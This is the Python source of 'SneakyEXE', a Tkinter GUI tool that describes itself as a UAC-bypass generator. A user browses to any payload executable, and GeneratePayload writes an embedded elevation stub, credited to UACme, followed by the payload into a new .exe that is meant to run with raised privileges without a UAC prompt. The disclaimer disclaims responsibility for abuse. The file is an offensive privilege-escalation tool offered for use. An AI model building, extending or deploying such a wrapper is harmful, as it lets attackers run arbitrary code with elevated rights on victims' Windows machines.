# coding=utf8
# -*- coding: utf8 -*-
'''
 /$$$$$$                                /$$                 /$$$$$$$$ /$$   /$$ /$$$$$$$$
/$$__  $$                              | $$                | $$_____/| $$  / $$| $$_____/
| $$  \__/ /$$$$$$$   /$$$$$$   /$$$$$$ | $$   /$$ /$$   /$$| $$      |  $$/ $$/| $$
|  $$$$$$ | $$__  $$ /$$__  $$ |____  $$| $$  /$$/| $$  | $$| $$$$$    \  $$$$/ | $$$$$
\____  $$| $$  \ $$| $$$$$$$$  /$$$$$$$| $$$$$$/ | $$  | $$| $$__/     >$$  $$ | $$__/
/$$  \ $$| $$  | $$| $$_____/ /$$__  $$| $$_  $$ | $$  | $$| $$       /$$/\  $$| $$
|  $$$$$$/| $$  | $$|  $$$$$$$|  $$$$$$$| $$ \  $$|  $$$$$$$| $$$$$$$$| $$  \ $$| $$$$$$$$
\______/ |__/  |__/ \_______/ \_______/|__/  \__/ \____  $$|________/|__/  |__/|________/
                                                  /$$  | $$
                                                 |  $$$$$$/
                                                  \______/
 #==============================[Description]========================================#
 #                                                                                   #
 # >> bio : Customize payloads and help it elevating privlege, Bypassing UAC         #
 # >> Author  : Zenix Blurryface                                                     #
 # >> Version : v1.2 demo                                                            #
 # >> License : It was mostly self-written but this tool does embed UACme - Author : #
 #              hfiref0x : https://github.com/hfiref0x                               #
 # >> Disclaimer : This tool was made for reluctant but humane situations or academic#
 #                 purposes only, i ain't taking any responsibility if you abuse it. #
 #                                                                                   #
 #===================================================================================#
'''
import tkinter, time, os, mimetypes, webbrowser,random
from tkinter import messagebox as TkMessagebox
from HexdumpPay import PayloadByte
from Icon import IconBytes     # Icon
from Banner import BannerBytes # Banner
from tkinter import filedialog as OpenUpPromptSelect
from PIL import Image, ImageTk
from threading import Thread

THreadI= False
THreadB = False
EntryA = 0
VarDone = 0 # This variable indicates the success of the selecting process
			# if "select executable" and "select directory" are finished, it will proceed
			# and provoke the Naming option
LINK_TO_TUTORIAL = "hrebrand.ly/b4e7sv"
FACEBOOK = "https://www.facebook.com/Zenix.Blurryface/"
TWITTER  = "https://twitter.com/ZenixBlur"
GITHUB   = "https://github.com/Zenix-Blurryface"

title = "SneakyEXE" # The title for this GUI to prompt

def IInformation():
	global THreadI
	if THreadI:
		return None
	THreadI = True

	InfoW = tkinter.Tk()
	InfoW.configure(bg="white")
	InfoW.geometry("430x570+0+0")

	Description = tkinter.Label(InfoW, text=" ● Description ",font=("Courier","20","bold"),bg="white",pady=2)
	Description.grid(row=0,column=0,sticky="w")
	a = tkinter.Text(InfoW,
		bg="white",
		width=42,
		height=5 ,
		font=("Courier","12")
	)
	a.insert(tkinter.END,"- A UAC-Bypassying generator for your\ncustom payloads.Just browse your payload\ninto this tool and it will automatically\nelevate without UAC when executed\n + Coded in : Python, C")
	a.configure(highlightthickness=0)
	a.configure(borderwidth=0)
	a.grid(row=1,column=0,sticky="ns")
	a.configure(state=tkinter.DISABLED)
	Lab = tkinter.Label(InfoW,text="[ Basic tutorial ]",bg="white",fg="green",font=("Verdana", "12"))
	Lab.bind("<Enter>", lambda event:Lab.configure(fg="red"))
	Lab.bind("<Leave>", lambda event:Lab.configure(fg="green"))
	Lab.bind("<Button-1>", lambda event:webbrowser.open_new_tab(LINK_TO_TUTORIAL))
	Lab.grid(row=2,column=0,sticky="we")

	License = tkinter.Label(InfoW, text=" ● LICENSE ",font=("Courier","20","bold"),bg="white",pady=2)
	License.grid(row=3, column=0,sticky="w")
	license = tkinter.Text(InfoW,bg="white",width=42, height=6,font=("Courier", "12"),borderwidth=0, highlightthickness=0)
	license.insert(tkinter.END, " + Copyright © 2019 By Zenix Blurryface\n + Credit : Coded by Zenix Blurryface\n + Sub-credit : This tool did embed UACme\nwhich was an open-sourced project\n + UACme's Author : hfiref0x")
	license.configure(state=tkinter.DISABLED)
	license.grid(row=4, column=0,sticky="w")
	license.configure(state=tkinter.DISABLED)

	Disclaimer = tkinter.Label(InfoW, text=" ● Acknowledgement ",font=("Courier","20","bold"),bg="white",pady=2)
	Dis = tkinter.Text(InfoW, bg="white", width=42, height=3,font=("Courier", "12"),borderwidth=0, highlightthickness=0)
	Dis.insert(tkinter.END, " - Huge thank to hfiref0x, the author of\nUACme so i could implement it within this tool")
	Dis.grid(row=6,column=0,sticky="w")
	Dis.configure(state=tkinter.DISABLED)
	Disclaimer.grid(row=5, column=0,sticky="w")

	Contact = tkinter.Label(InfoW, text=" ● Contact ",font=("Courier","20","bold"),bg="white")
	ContactIn = tkinter.Text(InfoW, bg="white", width=48, height=6,font=("Courier", "11"),borderwidth=0, highlightthickness=0)
	ContactIn.insert(tkinter.END, " [ Me ]\n")
	ContactIn.insert(tkinter.END, "  * Github  : %s\n" % GITHUB)
	ContactIn.insert(tkinter.END, "  * Facebook: %s\n" % FACEBOOK)
	ContactIn.insert(tkinter.END, "  * Twitter : %s\n" % TWITTER)
	ContactIn.insert(tkinter.END, " [ hfirefox ]\n")
	ContactIn.insert(tkinter.END, "  * Github: https://github.com/hfiref0x\n")
	ContactIn.configure(state=tkinter.DISABLED)
	ContactIn.grid(row=8,column=0, sticky="w")
	Contact.grid(row=7, column=0,sticky="ws")

	InfoW.mainloop()
	THreadI = False

def HelpPrompt():
	global THreadB

	THreadB = True
	HelpW = tkinter.Tk()
	HelpW.resizable(1,0)

	Frame  = tkinter.Frame(HelpW, bg="white")
	Frame1 = tkinter.Frame(HelpW,bg="white")
	Frame2 = tkinter.Frame(HelpW,bg="white")
	Copyright = tkinter.Frame(HelpW)
	Frame.pack()
	Frame1.pack()
	Frame2.pack()
	Copyright.pack(side=tkinter.BOTTOM)

	HelpW.geometry("410x445+0+0")
	HelpW.configure(bg="white")
	Topic1 = tkinter.Label(Frame1,text=" ● Browse",font=("Courier", "17", "bold"),bg="white")
	Description1 = tkinter.Text(Frame1,bg="white",borderwidth=0,width=61,height=5, highlightthickness=0,font=("8"))
	Description1.insert(tkinter.END, " - Used to browse your specified payload into the tool for\n further usage.\n  WARNING : your file must be a valid Windows executable\n with a valid mimetype.")
	Description1.tag_add("start", "3.2","3.9")
	Description1.tag_config("start", background="white", foreground="red",font=("Courier","14","bold"))
	Description1.configure(state=tkinter.DISABLED)
	Topic2 = tkinter.Label(Frame1,text=" ● Save as",font=("Courier", "17", "bold"),bg="white")
	Description2 = tkinter.Text(Frame1,bg="white",borderwidth=0,width=61,height=2, highlightthickness=0,font=("8"))
	Description2.insert(tkinter.END, " - Selecting the directory where your updated payload will\n be gernated at.")
	Description2.configure(state=tkinter.DISABLED)
	Topic3 = tkinter.Label(Frame1,text=" ● \"Name\",\"Status\",\"Type\"",font=("Courier", "17", "bold"),bg="white")
	Description3 = tkinter.Text(Frame1, bg="white",borderwidth=0,width=61,height=3, highlightthickness=0,font=("8"))
	Description3.insert(tkinter.END,"  + Name : Output name of the updated payload\n")
	Description3.insert(tkinter.END,"  + Status : Provide the status of the process/payload\n")
	Description3.insert(tkinter.END,"  + Type : Show the type of the specified executable\n")
	Description3.configure(state=tkinter.DISABLED)
	Topic4 = tkinter.Label(Frame1,text=" ● Generate",font=("Courier", "17", "bold"),bg="white")
	Description4 = tkinter.Text(Frame1, bg="white",borderwidth=0,width=61,height=3, highlightthickness=0,font=("8"))
	Description4.insert(tkinter.END, " - Generating the adjusted/updated payload when all of the\n required procedures above are done. If there is any error\n meanwhile, it will pop-up a prompt and alert you.")
	CopyText = tkinter.Label(Copyright, text="Copyright © 2019 By Zenix Blurryface",font='\"Trebuchet MS\" 12 bold',bg="white")

	Tutorial = tkinter.Label(Frame2,bg="white", text="  = Click here for tutorial = ", font=("Courier", "10", "bold"))
	Tutorial.bind("<Enter>", lambda event:Tutorial.configure(bg="black", fg="white"))
	Tutorial.bind("<Leave>", lambda event:Tutorial.configure(bg="white", fg="black"))
	Tutorial.bind("<Button-1>", lambda event:webbrowser.open_new_tab(LINK_TO_TUTORIAL))

	Topic1.grid(row=0, column=0,sticky="w")
	Description1.grid(row=1,column=0,sticky="we")
	Topic2.grid(row=2, column=0,sticky="w")
	Description2.grid(row=3, column=0, sticky="we")
	Topic3.grid(row=4, column=0,sticky="w")
	Description3.grid(row=5, column=0, sticky="we")
	Topic4.grid(row=6, column=0,sticky="w")
	Description4.grid(row=7, column=0, sticky="we")
	Tutorial.grid(row=0, column=0, sticky="we",pady=10)
	CopyText.pack()

	HelpW.mainloop()
	THreadB = False

def RunPrompt():
	global IInformation
	InformationPrompt = Thread(target=IInformation)
	InformationPrompt.start()

RandomDir = lambda:"".join([ASCII[random.randint(0,61)] for i in range(40)])

class MainWindows: # Invoking the GUI to initialize

	# MainLoop occurs here
	def __init__(self, root, title):

		global VarDone,THreadI # You know it :}

		self.I = "C:\\Users\\Public\\Icon"
		self.B = "C:\\Users\\Public\\Banner"

		while os.path.isfile(self.I+".png"):
			self.I += "_"
		self.I += ".png"
		while os.path.isfile(self.B+".png"):
			self.B += "_"
		self.B += ".png"
		open(self.I, "wb").write(IconBytes)
		open(self.B, "wb").write(BannerBytes)
		self.StartInfo = False# See whether the information prompt has pop up yet
		self.mainW = root
		self.title = title
		self.LangVar = 0
		self.icon = tkinter.PhotoImage(file=self.I)
		self.Screenwidth = self.mainW.winfo_screenwidth()
		self.Screenheight = self.mainW.winfo_screenheight()

		self.X = str(round(self.Screenwidth/2 - 200))
		self.Y = str(round(self.Screenheight/2 - 220)-25)

		self.mainW.tk.call('wm', 'iconphoto', self.mainW._w, self.icon)
		self.mainW.geometry("400x400+%s+%s"%(self.X,self.Y))
		self.mainW.configure(bg="white")

		self.Menubar = tkinter.Menu(self.mainW)
		self.MainMenu = tkinter.Menu(self.Menubar, tearoff=0)
		self.LanguageBar = tkinter.Menu(self.Menubar, tearoff=0)

		self.MainMenu.add_command(label="About", command=RunPrompt)
		self.MainMenu.add_command(label="Help", command=self.HelpingBox)
		self.MainMenu.add_separator()
		self.MainMenu.add_command(label="Exit", command=self.ExitMainW)
		self.Menubar.add_cascade(label="Help", menu=self.MainMenu)

		self.English = tkinter.BooleanVar()
		self.English.set(True)
		self.Vietnamese = tkinter.BooleanVar()
		self.LanguagesEncoding = {
			str(self.English):(
				"No file selected",
				"Browse",
				"No directory selected",
				"Save as",

				" ○  Name   :",
				"  ○ Status : ",
				"  ○ Type   : ",

				"<None>",
				"<No file selected>",
				"<No file selected>",
				"Generate",
				"\nSeem like you don't have permission to read this file. Please recheck the privilege or maybe try to \"Run As Administrator\".",
				"\nSeem like you don't have permission to write to this directory. Please recheck the privilege or maybe try to \"Run As Administrator\".",
				" ● Name  :",
				"  ● Status : ",
				"  ● Type   : ",
				"Success",
				"Invalid executable type",
				"Invalid mimetypes",

				"Unknown",
				"\nSeem like the output file have already existed. Proceeding will overwrite it, or you can input another name in the \"Name\" section.\n- Proceed ?",
				"\nUnable to overwrite. Permission denied",
				"Generating...",
				"\nSuccessfully created",
				"\n%s%s%s%sinvalid. Proceeding might make your payload failed to successfully execute.\n- Proceed ?",
				"the executable-payload ",
				"and ",
				"the payload's mimetype ",
				"is ", "are ",
				"\nOuput filename can't contain the following characters due to Windows naming convention --> \"<,>,\\,/,?,*,|,:\""
			),
			str(self.Vietnamese):(
				"Tệp tin chưa xác định",
				"Chọn tệp",
				"Danh mục chưa xác định",
				"Lưu tại",

				" ○ Tên tệp     :",
				"  ○ Trạng thái : ",
				"  ○ Định dạng  : ",

				"<Chưa xác định>",
				"<Tệp tin chưa xác định>",
				"<Tệp tin chưa xác định>",
				"Tạo file",
				"\nKhông có quyền đọc tệp được xác định. Hãy xem lại quyền sỡ hữu của file hay cân nhắc chạy chương trình này bằng quản trị viên (\"Run as Administrator\")",
				"\nKhông có quyền ghi tới danh mục được xác định. Hãy xem lại quyền sỡ hữu của danh mục hay cân nhắc chạy chương trình này bằng quản trị viên (\"Run as Administrator\")",
				" ● Tên tệp     :",
				"  ● Trạng thái : ",
				"  ● Kiểu tệp    : ",
				"Hợp lệ",
				"Kiểu file không hợp lệ",
				"Định dạng file không hợp lệ",

				"Không xác định",
				"\nFile đầu ra đã tồn tại. Tiếp tục sẽ ghi đè lên nội dung file hay bạn có thể chọn một tên file khác trong phần \"Tên tệp\".\n - Tiếp tục ?",
				"\nKhông thể ghi đè lên file. Quyền ghi lên file bị giới hạn",
				"Xử lý...",
				"\nTạo payload thành công",
				"\n%s%s%s%s hợp lệ. Tiếp tục sẽ có khả năng file sẽ không được thi hành thành công\n- Tiếp tục ?",
				"file payload ",
				"và ",
				"định dạng file ",
				"không ", "không ",
				"\nTên file đầu ra không thể bao gồm các ký tự sau vì quy ước đặt tên trên Windows --> \"<,>,\\,/,?,*,|,:\""
			)
		}
		self.FileChosen = False
		self.DirectoryChosen = False
		self.MIME_Status_1 = False
		self.StatusCodeIndex = 9

		self.LanguageBar.add_checkbutton(label="English", onvalue=1, offvalue=False, variable=self.English)
		self.LanguageBar.add_checkbutton(label="Vietnamese", onvalue=1, offvalue=False, variable=self.Vietnamese)
		self.Menubar.add_cascade(label="languages", menu=self.LanguageBar)

		self.mainW.config(menu=self.Menubar)
		self.mainW.resizable(0,0) # Disable resizing
		self.mainW.title(self.title)

		self.TopFrame = tkinter.Frame(self.mainW);self.TopFrame.pack(fill="both")
		self.BFrame = tkinter.Frame(self.mainW,bg="white");self.BFrame.pack()
		self.MidFrame = tkinter.Frame(self.mainW,bg="white");self.MidFrame.pack(pady=5,fill="both")
		self.ButtFrame= tkinter.Frame(self.mainW,bg="white");self.ButtFrame.pack(pady=10,fill="y")
		self.LastFrame= tkinter.Frame(self.mainW,bg="white");self.LastFrame.pack()#side=tkinter.BOTTOM)

		self.Photo = Image.open(self.B)
		self.Photo = self.Photo.resize((430,210),Image.ANTIALIAS)
		self.NewPho= ImageTk.PhotoImage(self.Photo)

		self.Lphoto = tkinter.Canvas(self.TopFrame, width=400, height=190,bg="black")

		self.Lphoto.pack()
		os.remove(self.B)
		os.remove(self.I)
		self.Lphoto.create_image(200,110,image=self.NewPho,anchor="center")
		self.Lphoto.configure(highlightthickness=0)
		# Selecting Payload section     #
		self.Selection = tkinter.Text(self.BFrame, height=1, width=40,fg="#7C8179")
		self.Selection.configure(highlightthickness=1)
		self.Selection.configure(borderwidth=0)
		self.Selection.configure(highlightbackground='black')

		self.Selection.insert(tkinter.END, "No file selected")
		self.Selection.config(state=tkinter.DISABLED)
		self.Selection.grid(row=0, column=0,sticky="nsew",pady=1)

		self.ChooseFileB = tkinter.Button(
			self.BFrame,
			text='Browse',
			height=1, width=9,
			fg='white',
			bg="black",
			command=self.BrowsingFile,
			font=(
				"Courier",
				"8",
				"bold"
			)
		)
		self.ChooseFileB.configure(highlightthickness=4)
		self.ChooseFileB.configure(borderwidth=0)
		self.ChooseFileB.grid(row=0, column=1,sticky="w",pady=1)
		self.ChooseFileB.bind("<Enter>",lambda event:self.ChooseFileB.configure(fg="white",bg="#4EAC70"))
		self.ChooseFileB.bind("<Leave>",lambda event:self.ChooseFileB.configure(fg="white",bg="black"))
		#################################

		self.Directory = tkinter.Text(self.BFrame, height=1, width=40,fg="#7C8179",bg="white")
		self.Directory.configure(highlightthickness=1)
		self.Directory.configure(borderwidth=0)
		self.Directory.configure(highlightbackground='black')
		self.Directory.insert(tkinter.END,"No directory selected")
		self.Directory.config(state=tkinter.DISABLED)
		self.Directory.grid(row=1, column=0, sticky="ewns",pady=0)
		self.ChooseDirB = tkinter.Button(
			self.BFrame,
			text='Save as',
			height=1, width=9,
			fg="white",
			bg="black",
			command=self.BrowsingDestination,
			font=(
				"Courier",
				"8",
			)
		)
		# self.ChooseDirB.configure(highlightbackground='green')
		self.ChooseDirB.configure(highlightthickness=4)
		self.ChooseDirB.configure(borderwidth=0)
		self.ChooseDirB.grid(row=1, column=1, sticky="w",pady=0)
		self.ChooseDirB.bind("<Enter>",lambda event:self.ChooseDirB.configure(fg="white",bg="#4EAC70"))
		self.ChooseDirB.bind("<Leave>",lambda event:self.ChooseDirB.configure(fg="white",bg="black"))

		self.NamingP = tkinter.Label(self.MidFrame,text=" ○  Name :",font=("Verdana", "8"),bg="white")
		self.NamingP.grid(row=1,column=0,pady=2)
		self.InputName = tkinter.Text(self.MidFrame, height=1, width=37, fg="#7C8179",bg="white")
		self.InputName.configure(highlightthickness=0)
		self.InputName.configure(borderwidth=0)
		self.InputName.insert(tkinter.END,"<None>")
		self.InputName.config(state=tkinter.DISABLED)
		self.InputName.grid(row=1,column=1,sticky="w")

		self.StatusBox= tkinter.Label(self.MidFrame, text="  ○ Status : ",font=("Verdana", "8"),bg="white")
		self.StatusBox.grid(row=2, column=0,pady=2)
		self.MessageStatus = tkinter.Text(self.MidFrame, font=("Verdana", "8"),height=1, width=37, fg="#7C8179",bg="white")
		self.MessageStatus.configure(highlightthickness=0)
		self.MessageStatus.configure(borderwidth=0)
		self.MessageStatus.insert(tkinter.END, "<No file selected>")
		self.MessageStatus.configure(state=tkinter.DISABLED)
		self.MessageStatus.grid(row=2, column=1,sticky="w")

		self.ContinueVar = False

		self.MimeType = tkinter.Label(self.MidFrame, text="  ○ Type   : ",font=("Verdana", "8"),bg="white")
		self.MimeType.grid(row=3,column=0)
		self.MessageType = tkinter.Text(self.MidFrame, font=("Verdana", "8"),height=1, width=37, fg="#7C8179",bg="white")
		self.MessageType.configure(highlightthickness=0)
		self.MessageType.configure(borderwidth=0)
		self.MessageType.insert(tkinter.END, "<No file selected>")
		self.MessageType.configure(state=tkinter.DISABLED)
		self.MessageType.grid(row=3,column=1,sticky="w")

		self.Generate = tkinter.Button(
			self.ButtFrame,
			text="Generate",
			bg="black",
			fg="white",
			highlightthickness=4,
			borderwidth=0,
			width=10,
			command=self.GeneratePayload
		)
		self.Generate.bind("<Enter>",lambda event:self.Generate.configure(fg="white",bg="#4EAC70"))
		self.Generate.bind("<Leave>",lambda event:self.Generate.configure(fg="white",bg="black"))
		self.Generate.pack(fill="y")

		self.Copyright = tkinter.Label(self.LastFrame, text="Copyright © 2019 By Zenix Blurryface",font='\"Trebuchet MS\" 10 bold',bg="white")
		self.Copyright.pack(fill=tkinter.Y)

		self.SLang = Thread(target=self.SwitchingLanguages)
		self.SLang.start()
		self.InitialC = Thread(target=self.CheckingThread) # Start checking
		self.InitialC.start()

		self.AlertCodes = {
			str(self.Vietnamese):("%s được xác định. Hãy chọn các phần cần thiết trước khi tiến hành.",(
				"file payload ", "và ", "danh mục đầu ra ", "chưa ", "chưa "
			)),
			str(self.English):("%s selected, Please specify one before proceeding.",(
				"payload ", "and ", "destination ", "aren't ", "isn't "
			))
		}
		self.CodeSetting = {
			str(self.Vietnamese):34,
			str(self.English):37
		}
		self.mainW.mainloop()

		self.ExitMainW()

	def HelpingBox(self):
		global THreadB
		if THreadB:
			return None
		self.THreadHelp = Thread(target=HelpPrompt)
		self.THreadHelp.start()

	def ExitMainW(self):
		os._exit(0) #Exit.... Dddduuuhhh .-.

	def MessageBox(self, type, Message):
		self.type = type
		self.Message = Message

		if self.type=="error":
			TkMessagebox.showerror(self.title,self.Message)
		elif self.type=="yn":
			return TkMessagebox.askquestion(self.title, self.Message,icon="warning")
		else:
			TkMessagebox.showinfo(self.title,self.Message)
		return 0

	def CheckingThread(self): # Checking the VarDone
		global VarDone,EntryA
		self.CaseA = EntryA
		self.Change = False
		self.Var = VarDone
		while 1:
			while VarDone!=2:
				if self.Change:
					self.MimeType.configure(text=self.LanguagesEncoding[str(self.L[-1])][4])
					self.MimeType.configure(font=("Verdana", "8"))
					self.MessageType.configure(state=tkinter.NORMAL)
					self.MessageType.configure(fg="#7C8179")
					self.MessageType.delete("1.0", tkinter.END)
					self.MessageType.insert(tkinter.END,self.LanguagesEncoding[str(self.L[-1])][9])
					self.MessageType.configure(state=tkinter.DISABLED)
					self.StatusBox.configure(text=self.LanguagesEncoding[str(self.L[-1])][5])
					self.StatusBox.configure(font=("Verdana", "8"))
					self.MessageStatus.configure(state=tkinter.NORMAL)
					self.MessageStatus.configure(fg="#7C8179")
					self.MessageStatus.delete("1.0", tkinter.END)
					self.MessageStatus.insert(tkinter.END,self.LanguagesEncoding[str(self.L[-1])][8])
					self.MessageStatus.configure(state=tkinter.DISABLED)
					self.NamingP.configure(text=self.LanguagesEncoding[str(self.L[-1])][6])
					self.NamingP.configure(font=("Verdana", "8"))
					self.ReSetInputName()
					self.Change=False
				time.sleep(0.0001) # Feel free to reduce this to fasten your system

			if not self.Change:
				self.TYPE = mimetypes.guess_type(self.File)[0]
				self.MIME_Status_1 =( True if self.TYPE==None else False)
				self.TYPE = self.LanguagesEncoding[str(self.L[-1])][19] if self.TYPE==None else self.TYPE
				self.SetType =ScanningFile(self.File)
				self.SetColor =(
                    ( "application" in self.TYPE) and self.SetType
				)
				self.MimeType.configure(text=self.LanguagesEncoding[str(self.L[-1])][15])
				self.MimeType.configure(font=("Verdana", "8","bold"))
				self.MessageType.configure(state=tkinter.NORMAL)
				self.MessageType.delete("1.0",tkinter.END)
				self.MessageType.insert(tkinter.END, self.TYPE)
				self.MessageType.configure(fg=("red" if "application" not in self.TYPE else "green"))
				self.MessageType.configure(state=tkinter.DISABLED)
				self.StatusBox.configure(text=self.LanguagesEncoding[str(self.L[-1])][14])
				self.StatusBox.configure(font=("Verdana", "8","bold"))
				self.MessageStatus.configure(state=tkinter.NORMAL)
				self.MessageStatus.delete("1.0", tkinter.END)
				self.MessageStatus.insert(tkinter.END,
					self.LanguagesEncoding[str(self.L[-1])][16] if self.SetColor else self.LanguagesEncoding[str(self.L[-1])][17] if not self.SetType else self.LanguagesEncoding[str(self.L[-1])][18]
				)
				self.StatusCodeIndex = 16 if self.SetColor else 17 if not self.SetType else 18
				self.MessageStatus.configure(fg=("green" if self.SetColor else "red"))
				self.MessageStatus.configure(state=tkinter.DISABLED)
				self.NamingP.configure(text=self.LanguagesEncoding[str(self.L[-1])][13])
				self.NamingP.configure(font=("Verdana", "8","bold"))
				self.InputName.configure(state=tkinter.NORMAL)
				self.InputName.configure(highlightthickness=1)
				self.InputName.configure(borderwidth=0)
				self.InputName.configure(highlightbackground="black")
				self.Change = True

			while self.CaseA==EntryA and self.Var==VarDone:
				time.sleep(0.0001) # Feel free to reduce this to fasten your system
			self.Var = VarDone

			# *[ time.sleep(0.0001) ]*
			# RECOMMENDATION : as lower as it gets, the tool can operate more accurately
			# but the slower your system will be, if you intend to adjust it, just make
			# sure it is at least 0.01 sec
			self.InputName.configure(state=tkinter.NORMAL)
			self.InputName.configure(fg="black")
			self.InputName.delete("1.0", tkinter.END)
			self.InputName.insert(tkinter.END,(os.path.basename(self.Selection.get("1.0", tkinter.END))).split(".exe")[0])
			self.CaseA = EntryA

	def ReSetInputName(self, Disable=True):
		self.NamingP.configure(font=("Verdana", "8"))
		self.InputName.configure(fg="#7C8179")
		self.InputName.configure(bg="white")
		self.InputName.configure(highlightthickness=0)
		self.InputName.configure(borderwidth=0)
		self.InputName.delete("1.0", tkinter.END)
		self.InputName.insert("1.0", self.LanguagesEncoding[str(self.L[-1])][7])
		self.InputName.configure(state=tkinter.DISABLED)

	def BrowsingDestination(self):
		global VarDone
		self.Output = OpenUpPromptSelect.askdirectory()
		if not self.Output:
			self.Output = ""
			return None;
		if not PermissionCheckDir(self.Output):
			self.StatusCodeIndex = 9
			if VarDone==2 or self.DirectoryChosen:
				self.ReSetInputName()
				VarDone-=1
			self.Output = ""
			self.DirectoryChosen=False
			self.Directory.configure(state=tkinter.NORMAL)
			self.Directory.configure(fg="#7C8179")
			self.Directory.delete("1.0",tkinter.END)
			self.Directory.insert(tkinter.END,self.LanguagesEncoding[str(self.L[-1])][2])
			self.Directory.configure(state=tkinter.DISABLED)
			self.MessageBox("error",self.Output+self.LanguagesEncoding[str(self.L[-1])][12])
			return None
		self.DirectoryChosen=True
		if VarDone<2 and self.Directory.get("1.0",tkinter.END).split("\n")[0]==self.LanguagesEncoding[str(self.L[-1])][2]:
			VarDone += 1
		self.Directory.configure(state=tkinter.NORMAL)
		self.Directory.configure(fg='black')
		self.Directory.delete("1.0",tkinter.END)
		self.Directory.insert(tkinter.END,self.Output)
		self.Directory.configure(state=tkinter.DISABLED)

	def BrowsingFile(self):
		self.FIrstFile = False
		global VarDone,EntryA
		self.File = OpenUpPromptSelect.askopenfilename(
			initialdir="C:\\Users\\"+os.getenv("USERNAME"),
			title="Choosing file...",
			filetypes=(("Executables", "*.exe"),("All files", "*"))
		)
		if not self.File:
			self.File = ""
			return None
		self.Selection.configure(state=tkinter.NORMAL)
		try:
			open(self.File, "rb")
		except PermissionError:
			self.File = ""
			self.StatusCodeIndex = 9
			if VarDone==2 or self.FileChosen:
				self.ReSetInputName()
				VarDone -= 1
			self.FileChosen = False
			self.Selection.configure(fg="#7C8179")
			self.Selection.delete("1.0",tkinter.END)
			self.Selection.insert(tkinter.END,self.LanguagesEncoding[str(self.L[-1])][0])
			self.Selection.configure(state=tkinter.DISABLED)
			self.MessageBox("error",self.File+self.LanguagesEncoding[str(self.L[-1])][11])
			return None
		self.FileChosen = True
		if VarDone<2 and self.Selection.get("1.0",tkinter.END).split("\n")[0]==self.LanguagesEncoding[str(self.L[-1])][0]:
			VarDone += 1
		self.Selection.configure(fg='black')
		self.Selection.delete("1.0",tkinter.END)
		self.Selection.insert(tkinter.END,self.File)
		self.Selection.configure(state=tkinter.DISABLED)
		EntryA += 1
		if VarDone==2:
			self.Change = False

	def GeneratePayload(self):

		self.Option = b"1_Option" # Shellcode = b"2_Option"
		if VarDone!=2:
			self.ErrorMessage = self.AlertCodes[str(self.L[-1])][0] % "%s%s%s%s" % (
				(self.AlertCodes[str(self.L[-1])][1][0] if not self.FileChosen else ""),
				(self.AlertCodes[str(self.L[-1])][1][1] if VarDone==0 else ""),
				(self.AlertCodes[str(self.L[-1])][1][2] if not self.DirectoryChosen else ""),
				(self.AlertCodes[str(self.L[-1])][1][3] if VarDone==0 else self.AlertCodes[str(self.L[-1])][1][4])
			)
			self.MessageBox("error",self.ErrorMessage.capitalize())
			return None
		self.NotifyL = self.LanguagesEncoding[str(self.L[-1])]
		self.OutName = self.InputName.get("1.0", tkinter.END).split("\n")[0]
		for i in self.OutName:
			if i in ("<",">","\\","/","?","*","|",":"):
				self.MessageBox("error", self.OutName+".exe"+self.NotifyL[30])
				return None
		self.OutputFileName = "\\".join(self.Output.split("\\")) + "\\" +self.OutName
		if os.path.isfile(self.OutputFileName+".exe"):
			self.answer = self.MessageBox("yn",self.OutputFileName + self.NotifyL[20]) # Yes/no
			if self.answer=="yes":
				if not OverwritePermission(self.OutputFileName):
					self.MessageBox("error", self.OutputFileName+self.NotifyL[21])
					return None
			else:
				return None
		self.Generate.configure(text=self.NotifyL[22])
		self.Valid_EXE = ScanningFile(self.File)
		self.MimetypeVad =(True if "application" in mimetypes.guess_type(self.File)[0] else False)
		if not self.Valid_EXE or not self.MimetypeVad:
			self.an = self.MessageBox("yn",self.File+str(self.NotifyL[24] %(
						(self.NotifyL[25] if not self.Valid_EXE else ""),
						(self.NotifyL[26] if not self.Valid_EXE and not self.MimetypeVad else ""),
						(self.NotifyL[27] if not self.MimetypeVad else ""),
						(self.NotifyL[29] if not self.Valid_EXE and not self.MimetypeVad else self.NotifyL[28])
					)
				).capitalize()
			)
			if self.an=="no":
				return None

		self.Dirname = os.path.basename(self.OutputFileName)
		self.Dirname += ("" if self.Dirname.partition(".")[-1]=="exe" else ".exe" )
		self.MainName = self.Dirname+("*"*(260-len(self.Dirname)))
		print(self.Dirname)
		with open(self.OutputFileName+".exe", "wb") as self.Payexe:
			with open(self.File, "rb") as self.DataPass:
				self.Payexe.write(PayloadByte.replace(
						b"X_Option", self.Option, 1 # Option
					).replace(
						Atterrisk_D, RandomDir().encode(),1 # DirectoryCode
					).replace(
						Atterrisk_N, self.MainName.encode(),1 #NamingConventionExe
					)
				)
				self.d = self.DataPass.read(10000)
				while(self.d!=b''):
					self.Payexe.write(self.d)
					self.d = self.DataPass.read(10000)

		self.Generate.configure(text=self.NotifyL[10])
		self.MessageBox(None,self.OutputFileName.replace("/","\\")+".exe"+self.NotifyL[23])

	def SwitchingLanguages(self):
		self.L = [self.Vietnamese, self.English]
		self.size = len(self.L)-1
		while 1:
			for index,i in enumerate(list(self.L[0:self.size])):
				if i.get():
					(self.C, self.N) = (self.L.pop(),self.L.pop(index))
					self.C.set(False)
					self.L.append(self.C)
					self.L.append(self.N)
					self.In = str(self.N)

					self.ChooseFileB.configure(text=self.LanguagesEncoding[self.In][1])
					self.ChooseDirB.configure(text=self.LanguagesEncoding[self.In][3])
					self.NamingP.configure(text=self.LanguagesEncoding[self.In][4 if VarDone!=2 else 13])
					self.StatusBox.configure(text=self.LanguagesEncoding[self.In][5 if VarDone!=2 else 14])
					self.MimeType.configure(text=self.LanguagesEncoding[self.In][6 if VarDone!=2 else 15])

					self.MessageType.configure(state=tkinter.NORMAL)
					if VarDone!=2:
						if not self.DirectoryChosen:
							self.Directory.configure(state=tkinter.NORMAL)
							self.Directory.delete("1.0", tkinter.END)
							self.Directory.insert(tkinter.END,self.LanguagesEncoding[self.In][2])
							self.Directory.configure(state=tkinter.DISABLED)
						if not self.FileChosen:
							self.Selection.configure(state=tkinter.NORMAL)
							self.Selection.delete("1.0", tkinter.END)
							self.Selection.insert(tkinter.END,self.LanguagesEncoding[self.In][0])
							self.Selection.configure(state=tkinter.DISABLED)
						self.InputName.configure(state=tkinter.NORMAL)
						self.InputName.delete("1.0", tkinter.END)
						self.InputName.insert(tkinter.END, self.LanguagesEncoding[self.In][7])
						self.InputName.configure(state=tkinter.DISABLED)

						self.MessageType.delete("1.0", tkinter.END)
						self.MessageType.insert(tkinter.END,self.LanguagesEncoding[self.In][8])
					else:
						if self.MIME_Status_1:
							self.MessageType.delete("1.0", tkinter.END)
